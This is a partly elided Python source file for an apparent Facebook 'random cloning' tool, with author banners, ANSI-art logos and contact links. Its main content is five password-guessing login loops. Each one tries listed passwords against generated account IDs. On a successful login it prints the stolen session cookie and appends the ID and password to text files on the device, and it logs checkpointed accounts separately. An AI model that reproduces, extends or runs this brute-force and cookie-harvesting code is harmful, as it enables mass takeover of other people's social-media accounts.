#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#Sc Make By TOUFIK Islam Hasan
#Gift By TOUFIK & HOSSAIN
#Github testour
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#••••••••••••••••••••••••IMPORT MODULE•••••••••••••••••••••••#
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
...
logo =("""
 ╔═════════════════════╗╔════════════════════════════╗   
 ║  ▄▄ • ▪  ·▄▄▄▄▄▄▄▄  ║║ Developar : TOUFIK Islam  ║
 ║ ▐█ ▀ ▪██ ▐▄▄·•██    ║║ Admin     : TOUFIK & Hasan  ║
 ║ ▄█ ▀█▄▐█·██▪  ▐█.▪  <> Github    : testourx        ║
 ║ ▐█▄▪▐█▐█▌██▌. ▐█▌·  ║║ Stetus    : Random Cloning  ║
 ║ ·▀▀▀▀ ▀▀▀▀▀▀  ▀▀▀   ║║ Code      : 0.1             ║
 ╚═════════════════════╝╚════════════════════════════╝""") 
cloninglogo =("""
...
\033[38;5;46m    P       "sss"     "sss"   P      P P     P 
 \033[1;97m╚══════════════════════════════════════╝
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║\033[1;95mOwner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mTOUFIK \033[1;90m<\033[1;92m•\033[1;90m] \033[1;95mV-01\033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
contactinfo = (""" 
\033[38;5;46msss sssss   sSSSs   d       b d sss  d d     S 
...
\033[38;5;46m    P       "sss"     "sss"   P      P P     P 
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║   \033[1;95m Owner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mTOUFIK     \033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
def Cloning_Linex():
...
def Nodi_Hasan():
    ...
    if Tahrima in ["0","E","e"]:
    	...
    	print("  \033[1;35m[\033[1;32m×\033[1;35m]\033[1;32m Worning Typ");TOUFIK()
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#••••••••••••••••••••••CONTACT INFO•••••••••••••••••••••••••••#
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
def Contact():
	...
	if Tymin in ['5']:
		os.system('xdg-open https://www.facebook.com/toufik.hossain.17x')
	if Tymin in ['6']:
		os.system('xdg-open wa.me/+8801322342876')
	if Tymin in ['7']:
		os.system('xdg-open https://www.facebook.com/toufik.hossain.17x')
	if Tymin in ['8']:
		os.system('xdg-open https://github.com/testourx')
	if Tymin in ['9']:
		TOUFIK()
	if Tymin in ['0']:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mTOUFIK-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;32m'+coki);open('/sdcard/TOUFIK-OK-M1.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('  \033[1;90m[TOUFIK-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/TOUFIK-CP-M1.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mTOUFIK-OᏦ\033[1;96m]\033[1;93m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;91m'+coki);open('/sdcard/TOUFIK-OK-M2.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[TOUFIK-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/TOUFIK-CP-M2.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mTOUFIK-OᏦ\033[1;96m]\033[1;97m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;93mCOOKIE : \033[1;95m'+coki);open('/sdcard/TOUFIK-OK-M3.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[TOUFIK-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/TOUFIK-CP-M3.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mTOUFIK-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');open('/sdcard/TOUFIK-OK-M4.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[TOUFIK-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/TOUFIK-CP-M4.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mTOUFIK-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;97m'+coki);open('/sdcard/TOUFIK-OK-M5.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[TOUFIK-ᏟᏢ] '+uid+' | '+ps+' \n')open('/sdcard/TOUFIK-CP-M5.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
